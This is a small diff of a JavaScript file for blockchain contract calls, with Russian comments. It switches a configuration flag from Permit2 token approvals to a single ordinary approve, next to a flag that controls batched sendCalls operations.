@@ -7,7 +7,7 @@ import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBa
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
-const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
+const USE_PERMIT2 = false; // true => использовать Permit2, false => обычный single approve
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
